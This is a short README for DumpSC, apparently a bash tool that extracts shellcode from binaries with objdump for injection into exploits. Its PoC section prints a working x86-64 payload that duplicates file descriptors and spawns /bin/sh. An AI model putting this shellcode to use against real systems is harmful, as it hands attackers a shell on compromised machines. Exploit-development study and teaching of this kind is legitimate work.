# DumpSC
DumpSC is a simple bash script to extract the shellcode from a binary with `objdump` and copy on the clipboard for future injection

## Usage:

```
bash dumpsc.sh <binary>
```

## PoC

Compile the `pocsh.asm` code:

```
nasm -f elf64 -o pocsh.o pocsh.asm
```

Execute `dumpsc.sh` passing it as an argument the generated binary

Get the shellcode ready to be injected as a payload in the exploit:

```
\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05
```
